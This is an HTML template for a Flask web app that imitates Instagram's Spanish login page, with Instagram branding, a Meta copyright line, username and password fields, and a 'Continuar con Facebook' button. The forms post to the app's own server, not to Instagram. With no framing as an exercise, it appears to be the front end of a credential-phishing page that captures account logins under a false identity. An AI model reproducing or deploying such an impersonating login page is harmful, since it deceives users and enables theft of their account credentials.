<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
</head>
<body>

<div class="wrapper">
    <div class="header">
        <div class="logo">
            <img src="{{ url_for('static', filename='images/instagram.png') }}" alt="instagram" style="width: 175px;">
        </div>
        <div class="form">
            <form action="" method="post">
                <div class="input_field">
                    <input type="text" placeholder="Teléfono, usuario o correo electrónico" class="input" name="username">
                </div>
                <div class="input_field">
                    <input type="password" placeholder="Contraseña" class="input" name="password">
                </div>
                <div class="btn">
                    <button class="login-btn" type="submit">Iniciar sesión</button>
                </div>
            </form>
        </div>
        <div class="or">
            <div class="line"></div>
            <p>O</p>
            <div class="line"></div>
        </div>
        <div class="dif">
            <form method="POST" action="/redirect_to_facebook">
                <button type="submit" class="fb">
                    <img src="{{ url_for('static', filename='images/facebook.png') }}" alt="facebook">
                    Continuar con Facebook
                </button>
            </form>
        </div>
        <div class="forgot">
            <a href="#">¿Olvidaste tu contraseña?</a>
        </div>
    </div>
    <div class="signup">
        <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
    </div>
    <div class="footer">
        <div class="copyright">
            © 2024 Instagram from Meta
        </div>
    </div>
</div>

</body>
</html>
